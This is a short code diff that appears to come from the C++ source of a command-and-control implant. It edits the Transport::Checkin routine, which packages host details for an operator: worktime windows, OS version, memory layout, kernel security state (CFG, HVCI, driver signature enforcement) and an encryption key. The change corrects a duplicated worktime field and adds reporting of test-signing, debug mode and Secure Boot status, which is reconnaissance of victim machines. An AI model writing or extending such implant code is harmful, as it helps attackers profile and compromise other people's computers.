@@ -50,7 +50,7 @@ auto DECLFN Transport::Checkin(
     // worktime informations
     Self->Pkg->Int32( CheckinPkg, Self->Config.Worktime.Enabled );
     Self->Pkg->Int16( CheckinPkg, Self->Config.Worktime.StartHour );
-    Self->Pkg->Int16( CheckinPkg, Self->Config.Worktime.EndHour );
+    Self->Pkg->Int16( CheckinPkg, Self->Config.Worktime.StartMin ); 
     Self->Pkg->Int16( CheckinPkg, Self->Config.Worktime.EndHour );
     Self->Pkg->Int16( CheckinPkg, Self->Config.Worktime.EndMin );
 
@@ -96,15 +96,17 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Int32( CheckinPkg, Self->Machine.OsMnrV );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.OsBuild );
 
-    // 
+    // memory info
     Self->Pkg->Int32( CheckinPkg, Self->Machine.AllocGran );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.PageSize );
-    
 
     // security informations
     Self->Pkg->Int32( CheckinPkg, Self->Machine.CfgEnabled );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.HvciEnabled );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.DseEnabled );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.TestSigningEnabled );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.DebugModeEnabled );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.SecureBootEnabled );
 
     // encryption key
     Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
